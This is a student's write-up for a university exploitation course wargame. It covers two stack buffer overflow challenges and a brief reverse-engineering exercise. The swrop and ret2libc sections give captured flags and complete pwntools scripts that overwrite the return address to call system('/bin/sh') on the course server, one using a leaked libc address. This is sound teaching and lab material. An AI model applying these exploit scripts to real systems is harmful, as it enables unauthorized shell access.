# COMP6447 Wargame 7
Written by WENG XINN CHOW(z5346077) on 18.07.2022

swrop
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiNi1zd3JvcCIsImlwIjoiMTAzLjIxNi4xOTAuMzciLCJzZXNzaW9uIjoiODFiZDE1NWYtNTcxNi00NGJjLTgwYmItZTMzYjE3NjBmMjRiIn0.5CLAHKcrpBshNtiUete5JDAdATOZ6bvxThTqIhWKyB8}

General overview of problems faced
-------------------------------------
1. Had to find  the offset of the return  address using ```cyclic```.
2. Had to understand ret2libc, which is ```system('/bin/sh')```. Therefore, after fnding the return address of ```system```, I had to figure out the  ```/bin/sh``` address in the binary. 
3. The final payload will be bunch of A's to overwrite the  return  address, followed by the ```system``` and ```/bin/sh``` addresses.

Script/Command used
------------------
```
from pwn import *

host = "comp6447.wtf"
port =  26332
p = remote(host, port)

# p = process("./swrop")

p.recvline()

offset = 136

system = 0x8048390
# binsh = next(libc.search(b'/bin/sh'))
# print(binsh)
binsh = 0x080485f0

payload = b'A' * offset
payload += p32(system)
payload += b'A' * 4
payload += p32(binsh)
# print(payload)
# gdb.attach(p)

p.sendline(payload)

p.interactive()
```
ret2libc
===========================
Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoiNi1yZXQybGliYyIsImlwIjoiMTAzLjIxNi4xOTAuMzciLCJzZXNzaW9uIjoiOTk1YTljMjUtZDBhZi00Y2I1LWJiZWQtMjhmNWY1NzQ4ZDZmIn0.EUuB3uy-xVxzjR3T09eRj_jdrBVTVoMdVBxNOJEiyW0}

General overview of problems faced
-------------------------------------
1. Had to find  the offset of the return  address using ```cyclic```.
2. Had to store the leaked libc address for ```setbuf``` function in the binary.
3. Since the libc version is known, we can find the address of the  libc address  for  ```setbuf``` in the libc version and then use the leaked addressed to subtract by this address to get the libc base address.
4. Once I got the libc base address, I was able to find the address of ```system``` and ```/bin/sh``` in the binary.

Script/Command used
------------------
```
from pwn import *

# p = process("./ret2libc")
# libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)

host = "comp6447.wtf"
port = 29471 
p = remote(host, port)

libc = ELF("./libc-2.27.so")

p.recvuntil(b'- ')
libc_leak = int(p.recvuntil(b' ')[:-1], 16)

log.info(f"libc leak:  {hex(libc_leak)}")
libc.address = libc_leak - libc.symbols['setbuf'] #  libcbase = libcbase + setbuf - setbuf
log.info(f"libc base: {hex(libc.address)}")

offset = 1230
payload = b'A' * 1230
payload += p32(libc.symbols['system'])
payload += b'A' * 4 # argument
payload += p32(next(libc.search(b'/bin/sh')))
# gdb.attach(p)

p.sendline(payload)

p.interactive()
```

re challenge
=============
General overview of problems faced
-------------------------------------
1. Had to study memory allocation in C. 
```C
int new() { 
    int a = 0;
    int i = 0;

    while(i <= 9){
        int *b = malloc(sizeof(int));
        if (*b != 0){
            if(a != 0){
                *b = 0;
            };
            a = *b;
        }
        else{
            break;
        };
        i++;
    };
    return a;
}
```